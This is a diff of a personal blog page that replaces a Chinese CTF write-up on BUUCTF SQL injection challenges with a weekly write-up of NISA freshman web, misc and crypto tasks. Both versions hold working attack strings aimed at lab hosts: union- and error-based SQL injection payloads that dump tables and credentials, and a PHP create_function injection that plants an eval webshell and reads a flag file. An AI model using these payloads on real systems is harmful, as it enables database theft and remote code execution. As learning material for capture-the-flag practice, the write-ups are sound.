@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SQL注入题目-BUU, 黛色若梦">
+    <meta name="keywords" content="game-week2, 黛色若梦">
     <meta name="description" content="A Freshman">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SQL注入题目-BUU | 黛色若梦</title>
+    <title>game-week2 | 黛色若梦</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SQL注入题目-BUU</h1>
+                    <h1 class="description center-align post-title">game-week2</h1>
                 </div>
             </div>
         </div>
@@ -430,13 +430,9 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/sql/">
-                                <span class="chip bg-color">sql</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -448,7 +444,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-03-14
+                    2022-03-25
                 </div>
                 
 
@@ -469,61 +465,90 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="sql注入题目-buu"><a href="#sql注入题目-buu" class="headerlink" title="sql注入题目-buu"></a>sql注入题目-buu</h1><p>好了作者是来把所有的坑踩一遍，然后来给你们排错的。</p>
-<h3 id="1-极客大挑战-2019-EasySQL"><a href="#1-极客大挑战-2019-EasySQL" class="headerlink" title="1.[极客大挑战 2019]EasySQL"></a>1.[极客大挑战 2019]EasySQL</h3><p>这题思路是万能钥匙没什么好说的，但是就是想提醒一点就是这里密码不知道所以我们在账号里不能用闭合而只能用注释，这样就与密码无关了。</p>
-<h3 id="2-极客大挑战-2019-LoveSQL"><a href="#2-极客大挑战-2019-LoveSQL" class="headerlink" title="2.[极客大挑战 2019]LoveSQL"></a>2.[极客大挑战 2019]LoveSQL</h3><p>这一题就是联合注入，没有过滤掉什么。</p>
-<h5 id="一般union过程格式"><a href="#一般union过程格式" class="headerlink" title="一般union过程格式"></a>一般union过程格式</h5><p>练一练过程摘录一下以后直接套：</p>
-<p>爆显示位：</p>
-<p>order by 3</p>
-<p>试一下显示位：</p>
-<p>union select 1,2,3 </p>
-<p>爆表：</p>
-<p>username=%20%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23&amp;password=111</p>
-<p>爆列：</p>
-<p>username=%20%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27l0ve1ysq1%27%23&amp;password=111</p>
-<p>爆字段：</p>
-<p>username=%20%27%20union%20select%201,2,group_concat(id,username,password)%20from%20l0ve1ysq1%23&amp;password=111</p>
-<h3 id="3-极客大挑战-2019-BabySQL"><a href="#3-极客大挑战-2019-BabySQL" class="headerlink" title="3.极客大挑战 2019]BabySQL"></a>3.极客大挑战 2019]BabySQL</h3><p>题目提醒采用过滤，我们先在原始页面尝试一下一些常见的注入点或注入方式。发现像一开始的easysql一样的是可以用#注释掉的，但是这里当输入：</p>
-<p><img src="../images/3.151.png" alt="3.151"></p>
-<p>回显被过滤 ，这个是属于被置换为空的类型，没有办法用bp去fuzz，所以我们就试着一个个去尝试。这里过滤了order，by，union，select，or，from，where都可以用双写绕过。</p>
-<h3 id="4-极客大挑战-2019-HardSQL"><a href="#4-极客大挑战-2019-HardSQL" class="headerlink" title="4.极客大挑战 2019]HardSQL"></a>4.极客大挑战 2019]HardSQL</h3><p>这一题犯了一个很致命的错误就是注入点是灵活的，但是我们一般选username然后可以把密码注释掉。</p>
-<p>然后发现了一个写着可以判断回显过滤的字符的页面，所以可以用bp来fuzz，然后线程要尽量小一点不让到后面都爆不出来了。</p>
-<p>还有一种方法就是</p>
-<h5 id="写sqlfuzz的脚本"><a href="#写sqlfuzz的脚本" class="headerlink" title="写sqlfuzz的脚本"></a>写sqlfuzz的脚本</h5><p><strong>“C:\Program Files\Python39\python.exe” D:/ctftools/webtools/3.SQL注入工具/盲注脚本/sql盲注/sqlfuzz.py</strong><br>通过: select<br>该字符是非法字符: union<br>该字符是非法字符: and<br>通过: or<br>该字符是非法字符: sleep<br>通过: where<br>通过: from<br>通过: limit<br>通过: group<br>该字符是非法字符: by<br>通过: like<br>通过: prepare<br>通过: as<br>该字符是非法字符: if<br>该字符是非法字符: char<br>该字符是非法字符: ascii<br>该字符是非法字符: mid<br>通过: left<br>通过: right<br>该字符是非法字符: substring<br>该字符是非法字符: handler<br>通过: updatexml<br>通过: extractvalue<br>该字符是非法字符: benchmark<br>该字符是非法字符: insert<br>通过: update<br>通过: all<br>通过: @<br>通过: #<br>通过: ^<br>通过: &amp;<br>该字符是非法字符: *<br>通过: ‘<br>通过: “<br>通过: ~<br>通过: `<br>通过: (<br>通过: )<br>通过: –<br>该字符是非法字符: =<br>通过: /<br>该字符是非法字符: <br>该字符是非法字符:  </p>
-<p>进程已结束，退出代码为 0</p>
-<h5 id="常见过滤替代："><a href="#常见过滤替代：" class="headerlink" title="常见过滤替代："></a>常见过滤替代：</h5><p>空格可以用括号替代；</p>
-<p>这里=可以用like表示；</p>
-<p>substr()可以用right代替。</p>
-<p>然后就可以快速判断可以用什么类型的注入方法。</p>
-<p>这题可以用</p>
-<h5 id="报错注入函数用法"><a href="#报错注入函数用法" class="headerlink" title="报错注入函数用法"></a>报错注入函数用法</h5><p>可以记忆一下函数的用法：</p>
-<p>extractvalue(1,concat(0x7e,执行语句))</p>
-<p>updatexml(1,concat(0x7e,执行语句),1)</p>
-<p>爆表名：</p>
-<p><a target="_blank" rel="noopener" href="http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(**select(table_name)**from(information_schema.tables)where(table_schema)like(database())))))%23&amp;password=122">http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(**select(table_name)**from(information_schema.tables)where(table_schema)like(database())))))%23&amp;password=122</a></p>
-<p>这里出现了一个错误，就是没有用group_concat,所以就没办法合在一行，因为这里只有一个字段就会显了，但是在爆列名时就出不来了。</p>
-<p>爆列名：</p>
-<p><a target="_blank" rel="noopener" href="http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)))))%23&amp;password=122">http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)))))%23&amp;password=122</a></p>
-<p>爆字段：</p>
-<p><a target="_blank" rel="noopener" href="http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)))))%23&amp;password=122">http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)))))%23&amp;password=122</a></p>
-<p>~1flagflag{6ca9ceb1-949e-4e57-bc’</p>
-<p>但是这里还有一个坑就是回显字段只有一半，所以应该还有一个函数可以限制字符输出长度。</p>
-<p>没出全，因为<strong>extractvalue和updatexml()都有最长32的长度限制</strong><br> 这时候就要想到mysql的一些函数，substr，left，right</p>
-<ul>
-<li>substr(字符串，起始位置，截取长度）</li>
-<li>left(字符串，截取长度)#从左往右截取<code>*</code>位</li>
-<li>right(字符串，截取长度)#从右往左截取<code>*</code>位</li>
-</ul>
-<p><a target="_blank" rel="noopener" href="http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(right(password,20))from(H4rDsq1)))))%23&amp;password=122">http://e86dfe0c-a276-4971-a11d-6da6adcf0ca0.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(right(password,20))from(H4rDsq1)))))%23&amp;password=122</a></p>
-<p>~7-bc26-288ca6328b3d}</p>
-<h3 id="5-强网杯-2019-随便注"><a href="#5-强网杯-2019-随便注" class="headerlink" title="5.强网杯 2019]随便注"></a>5.强网杯 2019]随便注</h3><p>判断注入点和注入的字段。判断是单引号注入和列数为2.</p>
-<p>用联合方式提交一个请求，发现过滤以下代码。所以我们就换一种注入方式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+                <h1 id="game-week2"><a href="#game-week2" class="headerlink" title="game-week2"></a>game-week2</h1><p>前言：</p>
+<p>这周学习python代码，学着写一写简单的代码脚本。</p>
+<p>这周周三的红明谷杯的misc题目消失的文件，属于内存取证的题目让我坐了一小时的牢。</p>
+<p>非预期解让我学会了以后一定要Ctrl+f打全flag{，红明谷和虎符的题目还没复现，下周找个时间复现一下。</p>
+<p>然后自己也想学着一个方向好好做题，比较有用。</p>
+<p>周五开始了NISA的新生赛来试着打一打：</p>
+<h2 id="NISA"><a href="#NISA" class="headerlink" title="NISA"></a>NISA</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>web手争取多做web题：</p>
+<h4 id="1-checkin"><a href="#1-checkin" class="headerlink" title="1.checkin"></a>1.checkin</h4><p>对照着修改</p>
+<p>编码：</p>
+<p>&amp;%E2%80%AE%E2%81%A6!!  %E2%81%A9%E2%81%A6 “  %E2%80%AE%E2%81%A6CTF%E2%81%A9%E2%81%A6l3hctf”==$_GET[  %E2%80%AE%E2%81%A6L3H  %E2%81%A9%E2%81%A6  password])</p>
+<p>&amp;%E2%80%AE%E2%81%A6L3H%E2%81%A9%E2%81%A6 password=%E2%80%AE%E2%81%A6CTF%E2%81%A9%E2%81%A6l3hctf</p>
+<p>%E2%80%AE%E2%81%A6%2B!!  %E2%81%A9%E2%81%A6 %26 %20%22   %E2%80%AE%E2%81%A6   %20Flag!%E2%81%A9%E2%81%A6N1SACTF %22%20%3D%3D%20%24_GET%5B  %E2%80%AE%E2%81%A6Ugeiwo  %E2%81%A9%E2%81%A6  cuishiyuan%5D)%20%7B%20%2F%2Ftnnd!%20weishenme%20b</p>
+<p>payload:?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6cuishiyuan=%E2%80%AE%E2%81%A6%20Flag!%E2%81%A9%E2%81%A6N1SACTF</p>
+<p>解码后：</p>
+<p>&amp;‮⁦!!  ⁩⁦ “  ‮⁦CTF⁩⁦l3hctf”==$_GET[  ‮⁦L3H  ⁩⁦  password])</p>
+<p>&amp;‮⁦L3H⁩⁦ password=‮⁦CTF⁩⁦l3hctf</p>
+<p>‮⁦+!!  ⁩⁦ &amp;  “   ‮⁦    Flag!⁩⁦N1SACTF “ == $_GET[  ‮⁦Ugeiwo  ⁩⁦  cuishiyuan]) { //tnnd! weishenme b</p>
+<p>payload:?ahahahaha=jitanglailo&amp;‮⁦Ugeiwo⁩⁦cuishiyuan=‮⁦ Flag!⁩⁦N1SACTF</p>
+<p>这一题可以搜到类似题，所以也算补充一个小知识点：</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2073fccfca4f">Unicode 控制字符及其有关的双向算法(BIDI算法) - 简书 (jianshu.com)</a></p>
+<h4 id="2-level-up"><a href="#2-level-up" class="headerlink" title="2.level-up"></a>2.level-up</h4><p>这是一道学习代码审计的好题，看来还是要多做题（虽然又臭又长</p>
+<p>就是MD5大混杂：</p>
+<p>这里的disallow一看就是robots.txt爬虫文件，这之前寒假在做攻防世界里有接触过，过level1，然后level2一段代码审计属于MD5强比较碰撞，具体的解法参考这篇blog，主要是string的问题：传入的最后转为字符串比较，所以数组就不行了。</p>
+<p><img src="../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-03-26%20001356.png" alt="屏幕截图 2022-03-26 001356"></p>
+<p>只能构造<strong>两个MD5值相同的不同字符串</strong></p>
+<p>array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>&amp;array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/John_lain/article/details/83478023">(53条消息) PHP中的MD5()函数漏洞_Tri0mphe的博客-CSDN博客</a></p>
+<p>我一开始直接在hackbar里跑一直不行，后来发现<strong>复制payload</strong>放进burp中跑，放hackbar会自动编码一次，是不行的。所以我们先用hackbar传参再用bp抓包修改：</p>
+<p>level3</p>
+<p><img src="../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-03-26%20001311.png" alt="屏幕截图 2022-03-26 001311"></p>
+<p>这里也是一个无法用数组绕过的sha1,网上找到有关文献：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/king-kb/p/15531476.html">SHA-1与MD5绕过 - king_kb - 博客园 (cnblogs.com)</a></p>
+<p>array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1<br>&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p>
+<p>来到level5</p>
+<p><img src="../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-03-26%20004445.png" alt="屏幕截图 2022-03-26 004445"></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Lee-404/p/12826352.html">parse_url绕过 - Lee-404 - 博客园 (cnblogs.com)</a></p>
+<p><img src="../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-03-26%20005022.png" alt="屏幕截图 2022-03-26 005022"></p>
+<p>真的要吐，说好的最后一层还有一层：</p>
+<p><img src="../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-03-26%20005118.png" alt="屏幕截图 2022-03-26 005118"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dyw_666666/article/details/90047968">(53条消息) Code-Breaking Puzzles easy - function（匿名函数利用）_烟敛寒林o的博客-CSDN博客</a></p>
+<p>这里的$a(‘’,$b);中的RCE存在代码命令注入的风险。</p>
+<p>最后一步有点像目录查询，我是直接写了一个木马注入：</p>
+<p><a target="_blank" rel="noopener" href="http://120.27.195.236:28991/55_5_55.php?a=%5Ccreate_function&amp;b=return%222333%22;%7Deval($_REQUEST%5B%27sky%27%5D);/*&amp;sky=system(%27ls%27)">http://120.27.195.236:28991/55_5_55.php?a=%5ccreate_function&amp;b=return%222333%22;}eval($_REQUEST[%27sky%27]);/*&amp;sky=system(%27ls%27)</a>;*</p>
+<p>就很神奇，第一天晚上一直搞不出来，后来重新做一遍才出来的，可能是环境问题。可以不用连菜刀：<a target="_blank" rel="noopener" href="http://120.27.195.236:28991/55_5_55.php?a=%5Ccreate_function&amp;b=2;%7Dprint_r(file_get_contents(%27../../../flag%27));/">http://120.27.195.236:28991/55_5_55.php?a=\create_function&amp;b=2;}print_r(file_get_contents(%27../../../flag%27));/</a>*</p>
+<p>虽然又臭又长，但是怎么说都是用好搜索引擎就可以get的题目。</p>
+<h4 id="3-bingdundun"><a href="#3-bingdundun" class="headerlink" title="3.bingdundun~"></a>3.bingdundun~</h4><p>is secret</p>
+<p>这种题目用后台扫了一下，发现robots.txt里说这题属于Android逆向CTF</p>
+<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><p>不会mics的web手不是好web手。</p>
+<h4 id="1-huaji？"><a href="#1-huaji？" class="headerlink" title="1.huaji？"></a>1.huaji？</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，文件头：FFD8FF </span><br><span class="line">PNG (png)，文件头：89504E47 </span><br><span class="line">GIF (gif)，文件头：47494638 </span><br><span class="line">TIFF (tif)，文件头：49492A00 </span><br><span class="line">Windows Bitmap (bmp)，文件头：424D</span><br></pre></td></tr></table></figure>
 
-<p>所以考虑其他注入方式，这里师傅们是用堆叠注入的方法。</p>
-<p>；后面是正常的mysql数据库查询语句。</p>
-<p>本地测试了一下，表名如果是数字，表名要加反单引号</p>
-
+<p>这题foremost分离后压缩包一开始解不出来，一开始感觉是伪加密。但是伪加密最前面的压缩源文件数据区<code>的全局方式位标记应当为</code>00 00 ，且<code>压缩文件目录区</code>的全局方式位标记应当为<code>09 00</code>。这里都是09 00 </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/120151522">https://blog.csdn.net/mochu7777777/article/details/120151522</a></p>
+<p>后来发现是在照相机的属性里看到有</p>
+<p><img src="../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-03-26%20112026.png" alt="屏幕截图 2022-03-26 112026"></p>
+<p>这样的密文，而照相机属性一般没有，是16进制加密。</p>
+<h4 id="2-where-is-here"><a href="#2-where-is-here" class="headerlink" title="2.where_is_here"></a>2.where_is_here</h4><p>携程查一下就有了，一开始还找了法人代表…神奇的脑洞，我差点要爆破他的号码了。</p>
+<h4 id="3-bqt"><a href="#3-bqt" class="headerlink" title="3.bqt"></a>3.bqt</h4><h4 id="4-一个不愉快的地方"><a href="#4-一个不愉快的地方" class="headerlink" title="4.一个不愉快的地方"></a>4.一个不愉快的地方</h4><p>找地方：</p>
+<p>NSSCTF{清溪川_37.56,126.97_金贤民_6801}</p>
+<h4 id="5-我什么也看不见"><a href="#5-我什么也看不见" class="headerlink" title="5.我什么也看不见"></a>5.我什么也看不见</h4><h5 id="文件头丢失的修改"><a href="#文件头丢失的修改" class="headerlink" title="文件头丢失的修改"></a>文件头丢失的修改</h5><p>首先是文件头部分丢失。要进行修改：</p>
+<p><img src="../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-03-27%20000943.png" alt="屏幕截图 2022-03-27 000943"></p>
+<p><img src="../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-03-27%20001041.png" alt="屏幕截图 2022-03-27 001041"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiangshangbashaonian/article/details/80156865?ops_request_misc=%7B%22request_id%22:%22164831123716782089325261%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164831123716782089325261&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-80156865.142%5Ev5%5Epc_search_result_cache,143%5Ev6%5Eregister&utm_term=png%E6%96%87%E4%BB%B6%E5%B0%BE&spm=1018.2226.3001.4187">(53条消息) 【CTF杂项】常见文件文件头文件尾格式总结及各类文件头_iqiqiya的博客-CSDN博客_gif文件头</a></p>
+<p>然后是lsb隐写</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq1437715969/article/details/103617581">(53条消息) LSB隐写(最低有效位隐写)_Floating Snow的博客-CSDN博客_lsb隐写</a></p>
+<h4 id="6-神秘的数字"><a href="#6-神秘的数字" class="headerlink" title="6.神秘的数字"></a>6.神秘的数字</h4><p>这一题：</p>
+<p>这里有五行神秘字符，看看它们分别代表什么吧 ovty fgh wnn 0678 3127 2347 0155 5074 MAZY AGD BMY NFA XOBV UCL A MFJI 40227 44801 36780 27620 YPTC QVIO MGBHU JYK 汉字是一种伟大的创造，是史上迄今为止连续使用时间最长的主要文字，也是上古时期各大文字体系中唯一传承至今的文字体系，到了现代，随着时代和信息的发展，人们从中引出了不少变形，他们都在为着汉字的安全性做出了贡献，时至今日，它们可能已经淘汰，但是对我们来说，他们仍有着一些现实意义。请你将得到的一句话转换成md5并包上NISA字符，flag形式为NSSCTF{md5值大写}</p>
+<p>ovty fgh wnn<br>数十亿    五笔</p>
+<p>0678 3127 2347 0155 5074</p>
+<p>合法操作者  电报</p>
+<p>MAZY AGD BMY NFA XOBV UCL A MFJI </p>
+<p>每天都体验着一种  郑码</p>
+<p>40227 44801 36780 27620</p>
+<p>有 共  识  的   四角码</p>
+<p>YPTC QVIO MGBHU JYK </p>
+<p>虚 拟 现 实  </p>
+<p><a target="_blank" rel="noopener" href="http://cangjie.quchacha.com/MGBHU.html">仓颉编码为MGBHU的汉字_仓颉编码查询_就要查 (quchacha.com)</a> </p>
+<p> 考汉字输入法：<a target="_blank" rel="noopener" href="https://zhidao.baidu.com/question/371212542972360284.html">中文输入法的发展历程_百度知道 (baidu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cidianwang.com/zd/sijiao.htm">四角号码_四角号码在线查询_四角号码字典_词典网 (cidianwang.com)</a></p>
+<p>搜中文输入法的发展历程，找输入法，然后对应特征。但是这里我并没有发现四角码，不过有找到字典编码，所以猜测还是有类似的编码方式，所以是四角码。 </p>
+<p>郑码  四角码 电报码 仓颉</p>
+<h4 id="7-bpt"><a href="#7-bpt" class="headerlink" title="7.bpt"></a>7.bpt</h4><p>010打开后发现是pdf格式的于是我们加后缀，修改透明度找到密文：c8e9aca0c3f4e6e5f2a1a0d4e8e5a0e6ece1e7a0e9f3baa0e6ece1e7fbf7e5e6e5efe9e4eae7efe5e4f3e6e9eff2f0e5e6e4e6e7e7e6e4f3e5fd</p>
+<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="1-sign-crypto"><a href="#1-sign-crypto" class="headerlink" title="1.sign_crypto"></a>1.sign_crypto</h4><p><img src="../images/task.png" alt="task"></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/67251812">LaTeX常用数学符号表示方法 - 知乎 (zhihu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://latex.codecogs.com/eqneditor/editor.php">在线LaTeX方程式编辑器 - 创建，集成和下载 (codecogs.com)</a></p>
+<h4 id="2-normal"><a href="#2-normal" class="headerlink" title="2.normal"></a>2.normal</h4><h4 id="3-funnycaeser"><a href="#3-funnycaeser" class="headerlink" title="3.funnycaeser"></a>3.funnycaeser</h4>
                 
             </div>
             <hr/>
@@ -549,7 +574,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE-BUU/">http://example.com/2022/03/14/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE-BUU/</a>
+                    <a href="http://example.com/2022/03/25/game-week2/">http://example.com/2022/03/25/game-week2/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -586,11 +611,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/sql/">
-                                    <span class="chip bg-color">sql</span>
-                                </a>
-                            
+                            <span class="chip bg-color">No tag</span>
                         </div>
                     
                 </div>
@@ -760,9 +781,48 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
+            <div class="card">
+                <a href="/2022/03/25/game-week2/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="game-week2">
+                        
+                        <span class="card-title">game-week2</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            hzk
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2022/03/20/game-week1/">
                     <div class="card-image">
@@ -780,9 +840,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-20
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -796,51 +856,6 @@
                     
                     <a href="/tags/game/">
                         <span class="chip bg-color">game</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/03/13/php%E4%BB%A3%E7%A0%81%E7%8E%AF%E5%A2%83/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="php代码环境">
-                        
-                        <span class="card-title">php代码环境</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-13
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            hzk
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                        <span class="chip bg-color">php代码审计</span>
                     </a>
                     
                 </div>
